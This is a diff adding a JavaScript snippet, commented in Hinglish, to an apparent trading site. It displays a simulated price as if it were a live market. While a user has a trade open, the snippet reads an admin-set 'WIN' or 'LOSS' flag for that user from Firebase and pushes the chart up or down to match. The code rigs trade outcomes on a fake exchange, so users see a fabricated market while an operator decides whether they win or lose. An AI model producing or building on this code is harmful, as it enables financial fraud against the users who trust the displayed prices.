@@ -1,0 +1,34 @@
+<script>
+    let currentPrice = 45000.00;
+    let isTradeActive = false;
+
+    // Simulation function jo price ko move karta hai
+    setInterval(() => {
+        const uid = auth.currentUser.uid;
+        db.ref('users/' + uid + '/control').once('value', s => {
+            const mode = s.val();
+            let change = (Math.random() - 0.5) * 10; // Normal movement
+
+            if (isTradeActive) {
+                // AGAR ADMIN NE FORCE WIN DIYA HAI
+                if (mode === "WIN") {
+                    change = Math.abs(change) + 2; // Hamesha thoda upar jerk dega
+                } 
+                // AGAR ADMIN NE FORCE LOSS DIYA HAI
+                else if (mode === "LOSS") {
+                    change = -Math.abs(change) - 2; // Hamesha niche jerk dega
+                }
+            }
+
+            currentPrice += change;
+            updateChartUI(currentPrice);
+        });
+    }, 1000);
+
+    function updateChartUI(price) {
+        const priceLabel = document.getElementById('price-line');
+        priceLabel.innerText = "$" + price.toFixed(2);
+        // Yahan aap chart ki candle height ko CSS se control kar sakte hain
+    }
+              </script>
+              
